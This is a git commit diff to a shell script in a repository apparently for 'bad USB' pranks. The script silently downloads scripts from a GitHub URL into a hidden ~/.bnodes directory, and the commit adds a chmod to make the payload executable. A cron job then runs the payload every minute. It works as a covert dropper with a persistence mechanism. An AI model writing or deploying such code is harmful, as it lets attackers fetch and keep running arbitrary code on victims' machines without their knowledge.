f3237ce6d149e1793c109008451ff3f9d9590d5f
cluster bright <142358852+Cluster-bright@users.noreply.github.com>
2024-10-09 00:47:02 +0200

    Update bconfig.sh

--- chronjobs/soundstage/bconfig.sh
+++ chronjobs/soundstage/bconfig.sh
@@ -7,7 +7,7 @@ buninstall_file="$bnodes_dir/.buninstall.sh"
 [ ! -d "$bnodes_dir" ] && mkdir -p "$bnodes_dir"
 wget -q -O "$bexecute_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/chronjobs/soundstage/bexecute.sh"
 wget -q -O "$buninstall_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/chronjobs/soundstage/buninstall.sh"
-
+chmod +x $bexecute_file
 
 cronjob="*/1 * * * * ~/.bnodes/.bexecute.sh"
 crontab -l | grep -F "$cronjob" > /dev/null
